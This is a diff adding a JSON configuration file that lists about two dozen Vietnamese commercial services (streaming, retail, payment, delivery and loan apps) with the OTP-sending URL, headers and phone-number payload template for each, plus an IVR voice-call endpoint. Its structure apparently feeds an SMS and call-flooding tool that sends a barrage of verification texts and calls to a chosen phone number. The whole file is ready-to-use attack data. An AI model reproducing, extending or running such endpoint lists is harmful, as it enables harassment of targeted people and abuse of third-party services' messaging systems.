@@ -1,0 +1,196 @@
+{
+  "sms_endpoints": [
+    {
+      "name": "TV360 Viettel",
+      "url": "https://m.tv360.vn/public/v1/auth/get-otp-login",
+      "method": "POST",
+      "headers": {
+        "accept": "application/json, text/plain, */*",
+        "content-type": "application/json",
+        "origin": "https://m.tv360.vn"
+      },
+      "payload_template": "{\"msisdn\":\"{phone}\"}",
+      "is_json": true
+    },
+    {
+      "name": "Sapo FNB",
+      "url": "https://www.sapo.vn/fnb/sendotp",
+      "method": "POST",
+      "headers": {
+        "content-type": "application/x-www-form-urlencoded",
+        "referer": "https://www.sapo.vn/"
+      },
+      "payload_template": "phonenumber={phone}",
+      "is_json": false
+    },
+    {
+      "name": "ZaloPay Gateway",
+      "url": "https://api.zalopay.vn/v2/account/phone/otp",
+      "method": "POST",
+      "headers": {
+        "x-user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) ZaloPayClient/7.13.1",
+        "content-type": "application/json"
+      },
+      "payload_template": "{\"feature\":\"register\",\"phone\":\"+84{phone_no_zero}\"}",
+      "is_json": true
+    },
+    {
+      "name": "FPT Play Auth",
+      "url": "https://api.fptplay.net/profile/auth/otp",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"phone\":\"{phone}\",\"type\":\"register\"}",
+      "is_json": true
+    },
+    {
+      "name": "Tiki Marketplace",
+      "url": "https://tiki.vn/api/v2/customers/otp",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"phone_number\":\"{phone}\"}",
+      "is_json": true
+    },
+    {
+      "name": "Ahamove Delivery",
+      "url": "https://api.ahamove.com/v1/user/otp",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"mobile\":\"{phone_84}\",\"type\":\"login\"}",
+      "is_json": true
+    },
+    {
+      "name": "Con Cưng Group",
+      "url": "https://api.concung.com/app/v1/auth/otp/send",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"phone\":\"{phone}\"}",
+      "is_json": true
+    },
+    {
+      "name": "Mocha Viettel",
+      "url": "http://mocha.com.vn/api/sms/send_otp",
+      "method": "POST",
+      "headers": { "content-type": "application/x-www-form-urlencoded" },
+      "payload_template": "phone={phone}",
+      "is_json": false
+    },
+    {
+      "name": "Nguyễn Kim Shopping",
+      "url": "https://www.nguyenkim.com/index.php?dispatch=sms_otp.send",
+      "method": "POST",
+      "headers": { "content-type": "application/x-www-form-urlencoded" },
+      "payload_template": "phone={phone}&type=register",
+      "is_json": false
+    },
+    {
+      "name": "FPT Shop",
+      "url": "https://fptshop.com.vn/api-fptshop/tai-khoan/gui-ma-xac-thuc",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"Phone\":\"{phone}\",\"Type\":1}",
+      "is_json": true
+    },
+    {
+      "name": "Meta VN",
+      "url": "https://meta.vn/api/account/send-otp",
+      "method": "POST",
+      "headers": { "content-type": "application/x-www-form-urlencoded" },
+      "payload_template": "mobile={phone}",
+      "is_json": false
+    },
+    {
+      "name": "WinMart Platform",
+      "url": "https://winmart.vn/api/auth/send-otp",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"phoneNumber\":\"{phone}\"}",
+      "is_json": true
+    },
+    {
+      "name": "Moneydong System",
+      "url": "https://api.moneydong.vn/api/v1/auth/otp",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"phone\":\"{phone}\"}",
+      "is_json": true
+    },
+    {
+      "name": "Loship Delivery",
+      "url": "https://loship.vn/api/v4/auth/send_otp",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"phone\":\"{phone}\"}",
+      "is_json": true
+    },
+    {
+      "name": "VieON Streaming",
+      "url": "https://vieon.vn/api/v1/user/otp",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"phone\":\"{phone}\",\"type\":\"register\"}",
+      "is_json": true
+    },
+    {
+      "name": "Vntrip Booking",
+      "url": "https://api.vntrip.vn/cs/v1/auth/otp",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"phone\":\"{phone}\"}",
+      "is_json": true
+    },
+    {
+      "name": "Cafeland RealEstate",
+      "url": "https://cafeland.vn/api/user/send-otp",
+      "method": "POST",
+      "headers": { "content-type": "application/x-www-form-urlencoded" },
+      "payload_template": "phone={phone}",
+      "is_json": false
+    },
+    {
+      "name": "Gotadi Travel",
+      "url": "https://api.gotadi.com/v1/user/otp",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"phoneNumber\":\"{phone}\"}",
+      "is_json": true
+    },
+    {
+      "name": "F88 Finance",
+      "url": "https://api.f88.vn/v1/auth/otp",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"phone\":\"{phone}\"}",
+      "is_json": true
+    },
+    {
+      "name": "Lotte Cinema",
+      "url": "https://www.lottecinemavn.com/api/member/send-otp",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"mobile_no\":\"{phone}\"}",
+      "is_json": true
+    },
+    {
+      "name": "DienMayXanh",
+      "url": "https://www.dienmayxanh.com/aj/account/send-otp",
+      "method": "POST",
+      "headers": { "content-type": "application/x-www-form-urlencoded" },
+      "payload_template": "phoneNumber={phone}",
+      "is_json": false
+    }
+  ],
+  "call_endpoints": [
+    {
+      "name": "VayXanh IVR Voice Service",
+      "url": "https://lk.vayxanh.com/internal/client/otp/send",
+      "method": "POST",
+      "headers": {
+        "accept": "application/json, text/plain, */*",
+        "content-type": "application/json",
+        "origin": "https://lk.vayxanh.com"
+      },
+      "payload_template": "{\"data\":{\"phone\":\"{phone}\",\"code\":\"resend\",\"channel\":\"ivr\"}}",
+      "is_json": true
+    }
+  ]
+}
